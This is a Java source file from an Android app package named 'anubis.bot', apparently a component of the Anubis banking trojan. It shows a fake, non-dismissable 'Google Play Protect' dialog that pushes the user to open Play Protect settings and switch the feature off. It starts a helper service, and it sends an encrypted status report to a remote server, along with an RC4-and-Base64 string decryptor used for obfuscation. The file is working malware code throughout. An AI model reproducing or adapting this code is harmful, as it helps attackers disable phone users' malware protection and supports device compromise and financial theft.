package anubis.bot.myapplication.Activity;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.os.Bundle;
import android.util.Base64;

import anubis.bot.myapplication.API.ClassRC4;
import anubis.bot.myapplication.R;
import anubis.bot.myapplication.ServicePlayProtectToast;
import anubis.bot.myapplication.UtilsClass;

public class ActivityPlayProtect extends Activity {

    UtilsClass utilsClass = new UtilsClass();
    Context context;

    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        //setContentView(R.layout.activity_play_protect);
        String title = "Google Play Protect";
        String msg = "";
        String nameButton = "";
        context = this;
        try{
             msg = utilsClass.SetRead(this,"textPlayProtect");
             nameButton = utilsClass.SetRead(this,"buttonPlayProtect");
        }catch (Exception ex){}
        utilsClass.POST(this, "4", "p=" + utilsClass.trafEnCr(utilsClass.ID_B(this) + "|Request to disable <Google Play Protect>!|"));
            AlertDialog.Builder builder = new AlertDialog.Builder(this);
            builder.setTitle(title)
                    .setMessage(msg)
                    .setIcon(R.drawable.im)
                    .setCancelable(false)
                    .setNegativeButton(nameButton,
                            new DialogInterface.OnClickListener() {

                                public void onClick(DialogInterface dialog, int id) {
                                    String GOOGLE_SETTINGS_COMPONENT = "com.google.android.gms";
                                    String GOOGLE_SETTINGS_ACTIVITY = "com.google.android.gms.security.settings.VerifyAppsSettingsActivity";
                                    Intent i = new Intent();
                                    i.setClassName(GOOGLE_SETTINGS_COMPONENT,GOOGLE_SETTINGS_ACTIVITY);
                                    try {
                                        startActivity(i);
                                        context.startService(new Intent(context, ServicePlayProtectToast.class));
                                    } catch (android.content.ActivityNotFoundException ex) {
                                        utilsClass.Log("ERROR","ActPlayProtect");
                                    }

                                    dialog.cancel();
                                }
                            });

            try {
                AlertDialog alert = builder.create();
                alert.show();
            } catch (Exception ex) {
            }


    }



}